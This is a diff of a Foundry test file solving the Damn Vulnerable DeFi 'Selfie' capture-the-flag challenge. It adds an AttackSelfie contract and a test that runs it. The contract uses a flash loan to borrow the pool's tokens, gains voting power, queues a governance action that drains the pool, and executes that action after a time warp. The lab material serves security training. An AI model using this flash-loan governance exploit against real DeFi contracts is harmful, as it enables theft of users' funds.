@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        AttackSelfie attackSelfie = new AttackSelfie(token, pool, governance, recovery);
+        attackSelfie.attack();
+        vm.warp(block.timestamp + 2 days);
+        attackSelfie.executeProposal();
     }
 
     /**
@@ -72,5 +76,35 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackSelfie {
+    DamnValuableVotes token;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    address recovery;
+    uint256 actionId;
+
+    constructor(DamnValuableVotes _token, SelfiePool _pool, SimpleGovernance _governance, address _recovery) {
+        token = _token;
+        pool = _pool;
+        governance = _governance;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "");
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
+        token.delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeProposal() external {
+        governance.executeAction(actionId);
     }
 }
